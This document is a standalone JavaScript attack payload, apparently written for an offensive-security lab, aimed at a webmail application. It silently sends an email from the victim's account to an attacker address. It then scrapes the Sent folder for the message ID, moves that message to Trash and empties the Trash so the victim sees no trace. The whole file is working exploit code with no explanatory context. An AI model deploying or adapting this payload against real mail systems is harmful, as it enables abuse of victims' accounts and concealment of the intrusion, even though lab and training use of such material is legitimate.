var email = "attacker@offsec.local";
var subject = "hacked!";
var message = "This is a test email!";

function empty_trash()
{
	var uri = "/index.php/mail/mail/emptyfolder/folder/INBOX.Trash/contextId/%23messageList"
	xhr = new XMLHttpRequest(); xhr.open("GET", uri , true); xhr.send(null); //empty trash.
}

function delete_sent(id)
{
	var uri = "/index.php/mail/mail/movetofolder/fromFolder/INBOX.Sent/toFolder/INBOX.Trash?resultContext=messageList&listFolder=INBOX.Sent&pageNumber=1&mailId%5B%5D="+id+"&unseen%5B"+id+"%5D=0";
	xhr = new XMLHttpRequest(); xhr.open("GET", uri , true); xhr.send(null);
	setTimeout(() => { empty_trash(); }, 20000);
}

function read_body(xhr)
{
	var data;
	if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	} else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	} else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	} else {
		data = xhr.response;
	}
	//return data;
	let regexp = /mailId\[\]\\" value=\\\"(.+?)\\/g;
	var match = regexp.exec(data);
	if (match[1] != null) {
		var mailid = Number(match[1])
		console.log("Before proceed to delete sentmail")
		delete_sent(mailid)
		return mailid
	} else {
		return "NULL"
	}
}

function send_email()
{
	var uri = "/index.php/mail/composemessage/send/tabId/viewmessageTab1";
	var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;

	xhr = new XMLHttpRequest(); xhr.open("GET", uri + query_string, true); xhr.send(null);
}

function get_sentmail()
{
	var uri = "/index.php/mail/mail/listfoldermessages/selectFolder/INBOX.Sent";

	xhr = new XMLHttpRequest(); xhr.open("GET", uri , true); xhr.send(null);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == XMLHttpRequest.DONE) {
			console.log(read_body(xhr));
		}
	}
}

send_email();
setTimeout(() => { get_sentmail(); }, 20000); //the delay is required for the send mail URL to be updated with the latest sent mail.
